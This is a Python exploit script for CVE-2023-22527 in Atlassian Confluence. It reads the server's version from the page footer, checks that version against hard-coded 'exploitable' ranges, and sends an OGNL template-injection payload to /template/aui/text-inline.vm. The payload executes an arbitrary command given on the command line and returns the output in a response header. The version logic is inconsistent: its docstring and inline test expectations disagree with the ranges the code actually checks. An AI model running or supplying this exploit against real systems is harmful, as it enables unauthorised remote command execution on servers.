import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse

def get_confluence_version(url):
    parsed_url = urlparse(url)
    url = f"http://{parsed_url.netloc}/"

    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        version_span = soup.find('span', {'id': 'footer-build-information'})

        if version_span:
            confluence_version = version_span.text.strip()
            return confluence_version

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return None

# def check_exploitable_version(version):
#     exploitable_versions = ['8.0.', '8.1.', '8.2.', '8.3.', '8.4.', '8.5.0', '8.5.1', '8.5.2', '8.5.3']
#     for exploitable_version in exploitable_versions:
#         if version.startswith(exploitable_version):
#             return True
#     return False

def version_to_list(version):
    """
    Converts version string (e.g., '8.3.5') to a list of integers [8, 3, 5].
    """
    return list(map(int, version.split('.')))

def check_exploitable_version(version):
    """
    Checks if the given version is within any exploitable range.
    Ranges: 8.3.1 to 8.3.5 and 7.3.2 to 7.3.5
    """
    version_list = version_to_list(version)

    # Define exploitable ranges
    exploitable_ranges = [
        (version_to_list('8.5.1'), version_to_list('8.5.5')),
        (version_to_list('7.3.2'), version_to_list('7.3.5'))
    ]

    # Check if the version falls within any of the ranges
    for start_version, end_version in exploitable_ranges:
        if start_version <= version_list <= end_version:
            return True

    return False

# 테스트 코드
print(check_exploitable_version('8.3.1'))  # True
print(check_exploitable_version('8.3.5'))  # True
print(check_exploitable_version('7.3.2'))  # True
print(check_exploitable_version('7.3.5'))  # True
print(check_exploitable_version('8.4.0'))  # False
print(check_exploitable_version('7.2.9'))  # False

def exploit(url, cmd):
    confluence_version = get_confluence_version(url)

    if confluence_version:
        print(f"Confluence version: {confluence_version}")

        if check_exploitable_version(confluence_version):
            
            url = f"{url}/template/aui/text-inline.vm"

            http_proxy = "http://127.0.0.1:8080"
            https_proxy = "http://127.0.0.1:8080"

            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'"+ cmd +"'}))"

            response = requests.post(url, headers=headers, data=data, verify=False)
            if (response.headers.get("X-Cmd-Response")):
                print("Command Output:")
                print(response.headers.get("X-Cmd-Response"))
            else:
                print("No response")
                
        else:
            print("The version cannot exploit the exploit")
    else:
        print("Unable to determine version of Confluence")

def main():
    parser = argparse.ArgumentParser(
        description="Send request with url and cmd parameters",
        usage="python3 CVE-2023-22527.py --url <url> --cmd <cmd>\nExample: python3 CVE-2023-22527.py --url http://192.168.139.202 --cmd \"whoami\""
    )
    parser.add_argument("--url", required=True, help="url address without http://")
    parser.add_argument("--cmd", required=True, help="Value for the cmd parameter")

    args = parser.parse_args()
    exploit(args.url, args.cmd)

if __name__ == "__main__":
    main()
